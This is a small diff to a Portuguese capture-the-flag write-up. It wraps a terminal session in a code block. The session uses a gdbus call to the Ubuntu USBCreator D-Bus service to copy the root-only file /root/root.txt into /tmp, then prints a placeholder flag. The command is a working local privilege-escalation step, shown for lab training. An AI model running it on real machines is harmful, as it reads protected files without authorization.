@@ -484,11 +484,13 @@ Essa falha permite que um usuário com acesso ao grupo `sudoers` ignore a polít
 
 Portanto, podemos ler o arquivo root.txt, mandando seu conteúdo para um arquivo vazio na pasta /tmp.
 
+```terminal
 $ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag true
 <all --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCrea<untu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.US<ath /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.< --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag true
 ()
 $ cat /tmp/flag
 ~flag root~
+```
 ## Conclusão
 
 
